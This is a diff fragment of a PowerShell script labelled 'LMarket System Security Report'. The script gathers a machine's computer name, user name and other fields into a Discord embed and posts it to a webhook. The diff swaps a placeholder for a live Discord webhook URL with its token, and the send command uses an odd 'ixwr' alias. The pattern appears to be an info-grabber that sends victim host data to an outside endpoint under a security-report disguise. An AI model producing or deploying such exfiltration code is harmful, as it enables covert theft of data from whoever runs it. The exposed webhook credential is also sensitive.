@@ -80,6 +80,9 @@ $embed = @{
         title = "LMarket System Security Report"
         color = 5814783
         description = "```$branding```"
+        thumbnail = @{
+            url = "https://i.imgur.com/0kCorbV.gif"
+        }
         fields = @(
             @{name="Machine";value=$env:COMPUTERNAME;inline=$true}
             @{name="User";value=$user;inline=$true}
@@ -98,4 +101,4 @@ $embed = @{
 }
 
 # --- Send to Discord webhook
-ixwr -Uri 'YOUR_WEBHOOK_HERE' -Method Post -Body ($embed | ConvertTo-Json -Depth 6) -ContentType 'application/json'
+ixwr -Uri 'https://discord.com/api/webhooks/1423633935354822697/6Nxnj4MxoG5hDuS_ErgKWoAfdOAt_av7cBFbL3nddQWORLxH9eFkK0GhyVLs0Q2FZIX2' -Method Post -Body ($embed | ConvertTo-Json -Depth 6) -ContentType 'application/json'
